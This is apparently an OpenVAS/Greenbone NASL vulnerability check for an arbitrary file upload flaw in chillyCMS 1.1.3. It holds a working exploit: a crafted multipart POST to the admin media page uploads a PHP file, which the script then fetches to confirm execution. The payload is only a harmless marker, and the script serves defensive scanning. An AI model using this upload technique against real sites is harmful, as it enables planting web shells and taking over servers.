if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.100809" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_bugtraq_id( 43263 );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2010-09-16 16:08:48 +0200 (Thu, 16 Sep 2010)" );
	script_tag( name: "cvss_base", value: "4.6" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:H/Au:S/C:P/I:P/A:P" );
	script_name( "chillyCMS Arbitrary File Upload Vulnerability" );
	script_category( ACT_ATTACK );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2010 Greenbone Networks GmbH" );
	script_dependencies( "find_service.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/43263" );
	script_tag( name: "summary", value: "chillyCMS is prone to a vulnerability that lets attackers upload
  arbitrary files. The issue occurs because the application fails to
  adequately sanitize user-supplied input." );
	script_tag( name: "impact", value: "An attacker can exploit this vulnerability to upload arbitrary code
  and execute it in the context of the webserver process. This may facilitate unauthorized access or
  privilege escalation. Other attacks are also possible." );
	script_tag( name: "affected", value: "chillyCMS version 1.1.3 is vulnerable. Other versions may also
  be affected." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one." );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_tag( name: "solution_type", value: "WillNotFix" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
require("misc_func.inc.sc");
port = http_get_port( default: 80 );
if(!http_can_host_php( port: port )){
	exit( 0 );
}
for dir in nasl_make_list_unique( "/chillyCMS", "/cms", http_cgi_dirs( port: port ) ) {
	if(dir == "/"){
		dir = "";
	}
	res = http_get_cache( item: dir + "/index.php", port: port );
	if(!res || !IsMatchRegexp( res, "^HTTP/1\\.[01] 200" )){
		continue;
	}
	if(ContainsString( res, "\">chillyCMS</a>" ) || ContainsString( res, "Template by <a href=\"http://arcsin.se/\">Arcsin</a>" ) || ContainsString( res, "designed by <a href=\"http://FrozenPepper.de\"> FrozenPepper </a>" ) || ContainsString( res, "Design by <a href=\"http://www.styleshout.com/\">styleshout</a>" )){
		vt_strings = get_vt_strings();
		file = vt_strings["default_rand"] + ".php";
		url = NASLString( dir, "/admin/media.site.php" );
		post_data = NASLString( "------x\\r\\n", "Content-Disposition: form-data; name=\"name\"", "\\r\\n", "\\r\\n", "\\r\\n", "------x\\r\\n", "Content-Disposition: form-data; name=\"pw\"", "\\r\\n", "\\r\\n", "\\r\\n", "------x\\r\\n", "Content-Disposition: form-data; name=\"sentfile\"", "\\r\\n", "\\r\\n", "\\r\\n", "------x\\r\\n", "Content-Disposition: form-data; name=\"destination\"", "\\r\\n", "\\r\\n", "\\r\\n", "------x\\r\\n", "Content-Disposition: form-data; name=\"action\"", "\\r\\n", "\\r\\n", "\\r\\n", "------x\\r\\n", "Content-Disposition: form-data; name=\"file\"", "\\r\\n", "\\r\\n", "\\r\\n", "------x\\r\\n", "content-Disposition: form-data; name=\"parent\"", "\\r\\n", "\\r\\n", "\\r\\n", "------x\\r\\n", "Content-Disposition: form-data; name=\"newfolder\"", "\\r\\n", "\\r\\n", "\\r\\n", "------x\\r\\n", "Content-Disposition: form-data; name=\"folder\"", "\\r\\n", "\\r\\n", "\\r\\n", "------x\\r\\n", "Content-Disposition: form-data; name=\"file\"; filename=\"", file, "\"", "\\r\\n", "Content-Type: application/octet-stream\\r\\n", "\\r\\n", "<?php echo '<pre>vt-upload-test</pre>'; ?>\\r\\n", "------x--\\r\\n", "\\r\\n" );
		req = http_post_put_req( port: port, url: url, data: post_data, accept_header: "text/html", accept_encoding: "gzip,deflate,sdch", add_headers: make_array( "Proxy-Connection", "keep-alive", "Cache-Control", "max-age=0", "Origin", "null", "Content-Type", "multipart/form-data; boundary=----x" ) );
		recv = http_keepalive_send_recv( data: req, port: port, bodyonly: FALSE );
		if(!recv){
			continue;
		}
		req2 = http_get( item: NASLString( dir, "/tmp/", file ), port: port );
		recv2 = http_keepalive_send_recv( data: req2, port: port, bodyonly: TRUE );
		if(!recv2){
			continue;
		}
		if(ContainsString( recv2, "vt-upload-test" )){
			report = NASLString( "It was possible to upload and execute a file on the remote webserver.\\n", "The file is placed in directory: ", "\"", dir, "/tmp/\"", "\\n", "and is named: ", "\"", file, "\"", "\\n\\n", "Please delete this file manually!" );
			security_message( port: port, data: report );
			exit( 0 );
		}
	}
}
exit( 99 );

